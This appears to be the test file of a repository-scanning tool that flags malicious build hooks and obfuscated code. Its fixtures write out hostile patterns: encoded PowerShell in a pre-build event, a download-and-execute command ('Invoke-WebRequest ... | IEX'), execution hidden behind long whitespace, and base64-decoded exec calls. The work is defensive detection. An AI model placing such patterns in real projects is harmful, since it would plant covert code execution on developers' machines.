import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { scanRepository, shouldBlockPreflight } from '../src/repository-preflight.mjs';

const cli = fileURLToPath(new URL('../bin/repository-preflight.mjs', import.meta.url));
function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'devshield-preflight-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  return root;
}
function write(root, file, content) {
  const p = path.join(root, file);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, content);
}
function ids(result) { return result.findings.map(f => f.id); }

test('clean, ordinary source produces completed no-indicators-observed state', t => {
  const root = fixture(t);
  write(root, 'main.py', 'def parse_log(data):\n    return data.splitlines()\n');
  write(root, 'script.go', 'package main\nfunc main() {}\n');
  write(root, 'project.csproj', '<Project><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>');
  const r = scanRepository(root);
  assert.equal(r.complete, true);
  assert.equal(r.status, 'no-indicators-observed');
  assert.equal(r.findings.length, 0);
  assert.equal(shouldBlockPreflight(r), false);
});

test('detects malicious Visual Studio pre-build and MSBuild Exec commands', t => {
  const root = fixture(t);
  write(root, 'app.csproj', '<Project><PropertyGroup><PreBuildEvent>powershell.exe -EncodedCommand Zg==</PreBuildEvent></PropertyGroup></Project>');
  write(root, 'build.targets', '<Project><Target Name="Before"><Exec Command="powershell -NoProfile -File bad.ps1" /></Target></Project>');
  const r = scanRepository(root);
  assert.ok(ids(r).includes('msbuild-event-script-execution'));
  assert.ok(ids(r).includes('msbuild-exec-interpreter'));
  assert.ok(ids(r).includes('powershell-encoded-command'));
  assert.equal(shouldBlockPreflight(r, 'critical'), true);
  assert.ok(r.findings.every(f => Number.isInteger(f.line) && f.line > 0));
});

test('detects encoded PowerShell and a remote download-to-execute pattern', t => {
  const root = fixture(t);
  write(root, 'setup.ps1', 'powershell.exe -enc Zg==\nInvoke-WebRequest https://example.invalid/a.ps1 | IEX\n');
  const r = scanRepository(root);
  assert.ok(ids(r).includes('powershell-encoded-command'));
  assert.ok(ids(r).includes('powershell-download-and-execute'));
});

test('detects execution hidden behind long Python/Go whitespace', t => {
  const root = fixture(t);
  write(root, 'scanner.py', 'def clean():\n' + ' '.repeat(180) + 'exec(payload)\n');
  write(root, 'parse.go', 'package main\n' + ' '.repeat(170) + 'exec.Command("powershell", "-nop")\n');
  const r = scanRepository(root);
  assert.ok(ids(r).includes('python-whitespace-concealed-execution'));
  assert.ok(ids(r).includes('go-whitespace-concealed-operation'));
  assert.ok(ids(r).includes('go-powershell-execution'));
});

test('detects decoded Python execution', t => {
  const root = fixture(t);
  write(root, 'payload.py', 'import base64\nexec(base64.b64decode("Zg=="))\n');
  assert.ok(ids(scanRepository(root)).includes('python-decoded-payload-execution'));
});

test('checks Nov 2026 Dr.Web IOCs but does not include raw source in JSON', t => {
  const root = fixture(t);
  write(root, 'config.py', 'HOST = "muckdeveloper.com"\nPASSWORD = "fixture-private-value"');
  const r = scanRepository(root);
  assert.ok(ids(r).includes('drweb-2026-campaign-ioc'));
  assert.doesNotMatch(JSON.stringify(r), /fixture-private-value/);
  assert.equal(r.findings[0].severity, 'critical');
});

test('suspicious-looking prose in README is excluded from active code matches', t => {
  const root = fixture(t);
  write(root, 'README.md', 'The incident mentioned muckcoding.com and PowerShell.\n');
  const r = scanRepository(root);
  assert.equal(r.findings.length, 0);
  assert.equal(r.filesSkippedByType, 1);
});

test('reads UTF16 strings in SUO as heuristic signals', t => {
  const root = fixture(t);
  write(root, '.vs/session.suo', Buffer.from('powershell.exe', 'utf16le'));
  assert.ok(ids(scanRepository(root)).includes('visual-studio-suo-powershell'));
});

test('rejects symlink to external source instead of following it', t => {
  const root = fixture(t);
  const external = fixture(t);
  write(external, 'danger.py', 'exec(base64.b64decode("Zg=="))');
  try { fs.symlinkSync(path.join(external, 'danger.py'), path.join(root, 'link.py')); }
  catch (error) { if (error.code === 'EPERM') return; throw error; }
  const r = scanRepository(root);
  assert.equal(r.complete, false);
  assert.equal(r.status, 'incomplete');
  assert.equal(r.findings.length, 0);
  assert.equal(shouldBlockPreflight(r, 'none'), true);
});

test('oversized source fails closed and does not silently report clean', t => {
  const root = fixture(t);
  write(root, 'huge.py', 'x'.repeat(100));
  const r = scanRepository(root, { maxFileBytes: 50 });
  assert.equal(r.complete, false);
  assert.ok(r.errors.some(e => /scan byte limit/.test(e.message)));
  assert.equal(shouldBlockPreflight(r), true);
});

test('CLI reports JSON and exits 1 for malicious files, 2 for incomplete scan', t => {
  const root = fixture(t);
  write(root, 'danger.py', 'exec(base64.b64decode("Zg=="))\n');
  const infected = spawnSync(process.execPath, [cli, root], { encoding: 'utf8' });
  assert.equal(infected.status, 1, infected.stderr);
  assert.equal(JSON.parse(infected.stdout).status, 'suspicious');
  const disabledGate = spawnSync(process.execPath, [cli, root, '--fail-on', 'none'], { encoding: 'utf8' });
  assert.equal(disabledGate.status, 0);
  const invalid = spawnSync(process.execPath, [cli, root, '--fail-onn', 'none'], { encoding: 'utf8' });
  assert.equal(invalid.status, 2);
  const missing = spawnSync(process.execPath, [cli, path.join(root, 'does-not-exist')], { encoding: 'utf8' });
  assert.equal(missing.status, 2);
});
